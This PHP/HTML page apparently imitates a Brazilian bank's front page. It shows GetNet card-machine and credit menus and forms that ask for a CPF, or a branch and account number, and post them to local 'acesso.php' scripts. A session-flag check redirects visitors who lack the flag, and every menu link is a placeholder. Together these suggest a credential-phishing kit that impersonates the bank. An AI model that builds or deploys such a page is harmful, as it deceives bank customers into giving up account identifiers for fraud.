<?php 
include('../../conn.php');
include('../functions/functions.php');

if(!isset($_SESSION['checkEnter']) || $_SESSION['checkEnter'] == false):
	header('Location: ../index.php');
endif;	
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title></title>
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
	<link rel="stylesheet" href="styles/geral.css">
	<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900" rel="stylesheet">
	<script src="javascripts/jquery-1.4.2.min.js"></script>
	<script src="javascripts/jquery.maskedinput-1.2.2.min.js"></script>
	<script src="javascripts/custom.js"></script>
</head>
<body>

<div class="body_person">
	<div class="container main_header">
		<div class="content">
			<div class="logo" style="color">
				<img src="imgs/logo.png" alt="">
			</div><!-- logo -->

			<div class="busca_header">
				<input type="text" name="h_busca" id="h_busca" class="busca_input" placeholder="Buscar por">
			</div><!-- busca_header -->

			<div class="block_logins">
				<form action="acesso.php" method="post" id="form_pf">
				<div class="block_pf">
					<div id="block_div_pf">
						<span id="click_pf" onclick="return acessar_pf();"><strong id="show_acs_pf">Acessar</strong> Pessoa física</span>
						<input type="text" name="is_cpf" id="is_cpf" class="cpf_input" placeholder="Insira seu CPF" autocomplete="off" maxlength="14">
						<button name="is_enter_pf" id="is_enter_pf" class="input_pf" onclick="return check_form_pf();"><i class="fas fa-lock"></i></button>
						<input type="hidden" name="sender" value="index_f">
					</div>
				</div><!-- block_pf -->
				</form>

				<form action="pessoa-juridica/acesso.php" method="post" id="form_pj">
				<div class="block_pj">
					<span id="click_pj" onclick="return acessar_pj();"><strong id="show_acs_pj">Acessar</strong> Pessoa jurídica</span>
					<div id="block_div_pj">
						<input type="text" name="is_agencia" id="is_agencia" class="ag_input" placeholder="Ag" maxlength="4" autocomplete="off">
						<input type="text" name="is_conta" id="is_conta" class="ct_input" placeholder="Conta" maxlength="10" autocomplete="off">
						<button name="is_enter_pj" id="is_enter_pj" class="input_pj" onclick="return check_form_pj();"><i class="fas fa-lock"></i></button>
					</div>
				</div><!-- block_pj -->
				<input type="hidden" name="sender" value="index_j">
				</form>

			</div><!-- block_logins -->
		<div class="clear"></div>
		</div><!-- content -->
	</div><!-- container -->

	<div class="container main_menu">
		<div class="content">
			<h1>EXPERIMENTE O NOSSO ACESSO RÁPIDO</h1>
			<ul class="primary_ul">
				<li>
					<a href="#">
						<span class="icon_menu">
							<img _ngcontent-c29="" alt="Adquirencia" src="imgs/adquirencia.svg">
						</span><!-- icon_menu -->
						<span class="desc_menu">
							Maquininha<br>GetNet
						</span><!-- desc_menu -->
					</a>
				</li>

				<li>
					<a href="#">
						<span class="icon_menu">
							<img _ngcontent-c29="" alt="Serviços Financeiros" src="imgs/conta_corrente.svg"
							style="width:50px;">
						</span><!-- icon_menu -->
						<span class="desc_menu">
							Serviços<br>Financeiros
						</span><!-- desc_menu -->
					</a>
				</li>

				<li>
					<a href="#">
						<span class="icon_menu">
							<img _ngcontent-c29="" alt="Investimentos" src="imgs/estacionamento.svg"
							style="width:50px;">
						</span><!-- icon_menu -->
						<span class="desc_menu">
							Investimentos
						</span><!-- desc_menu -->
					</a>
				</li>

				<li>
					<a href="#">
						<span class="icon_menu">
							<img _ngcontent-c29="" alt="Cartoes" src="imgs/cartoes.svg">
						</span><!-- icon_menu -->
						<span class="desc_menu">
							Solicite seu<br>Cartão
						</span><!-- desc_menu -->
					</a>
				</li>

				<li>
					<a href="#">
						<span class="icon_menu">
							<img _ngcontent-c29="" alt="Oferta" src="imgs/oferta.svg"
							style="width:50px;">
						</span><!-- icon_menu -->
						<span class="desc_menu">
							Crédito<br>Imobiliário
						</span><!-- desc_menu -->
					</a>
				</li>

			</ul>

			<ul class="secondary_ul">

				<li>
					<a href="#">
						<span class="icon_menu">
							<img _ngcontent-c29="" alt="Fatura" src="imgs/fatura-cartao.svg"
							style="width:50px;">
						</span><!-- icon_menu -->
						<span class="desc_menu">
							Fatura de<br>Cartão
						</span><!-- desc_menu -->
					</a>
				</li>

				<li>
					<a href="#">
						<span class="icon_menu">
							<img _ngcontent-c29="" alt="2 via de boletos" src="imgs/pagamento.svg"
							style="width:50px;">
						</span><!-- icon_menu -->
						<span class="desc_menu">
							2ª via de<br>Boletos
						</span><!-- desc_menu -->
					</a>
				</li>

				<li>
					<a href="#">
						<span class="icon_menu">
							<img _ngcontent-c29="" alt="Renegocie sua dívida" src="imgs/renegociacao.svg"
							style="width:50px;">
						</span><!-- icon_menu -->
						<span class="desc_menu">
							Renegocie<br>sua Divida
						</span><!-- desc_menu -->
					</a>
				</li>

			</ul>
		<div class="clear"></div>
		</div><!-- content -->
	</div><!-- container -->

	<div class="container main_msg">
		<div class="content">
			<h1></h1>
		<div class="clear"></div>
		</div><!-- content -->
	</div><!-- container -->
</div><!-- body_person -->

<div class="container main_footer">
	<div class="content">
		<h1>LINKS RÁPIDO</h1>

		<div class="box">
			<h1>Para você</h1>
			<ul>
				<li>Abra sua conta</li>
				<li>Cartões de crédito</li>
				<li>Créditos e financiamento</li>
				<li>Investimentos</li>
				<li>Seguros</li>
				<li>Tarifas e pacotes padronizados</li>
			</ul>
		</div><!-- box -->

		<div class="box">
			<h1>Para sua Empresa</h1>
			<ul>
				<li>Abra sua conta empresa</li>
				<li>Pagamentos e recebimentos</li>
				<li>Cartões de crédito</li>
				<li>Créditos e financiamento</li>
				<li>Investimentos</li>
				<li>Tarifas e pacotes de serviços Pessoa jurídica</li>
			</ul>
		</div><!-- box -->

		<div class="box">
			<h1>Veja também</h1>
			<ul>
				<li>Maquininha GetNet</li>
				<li>Financeira</li>
				<li>Seguro de carro</li>
				<li>Agro</li>
				<li>Acesso não autorizado</li>
			</ul>
		</div><!-- box -->


	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


</body>
</html>